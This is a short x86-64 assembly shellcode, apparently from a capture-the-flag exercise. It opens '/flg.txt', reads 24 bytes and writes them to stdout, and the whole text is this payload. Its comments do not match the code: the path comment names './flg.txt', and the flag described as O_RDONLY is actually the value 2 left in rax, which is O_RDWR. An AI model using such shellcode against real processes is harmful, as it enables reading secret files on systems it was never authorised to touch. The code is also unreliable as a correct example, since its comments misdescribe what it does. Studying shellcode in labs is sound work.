global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    xor rdi,rdi
    xor rax,rax
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov rsi, rax         ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov al, 0
    xor rdx,rdx
    mov dl, 24         ; size to read
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1          ; set fd to stdout
    mov dl, 24         ; size to read
    syscall

    ; exit
    ;mov rax, 60
    ;mov rdi, 0
    ;syscall

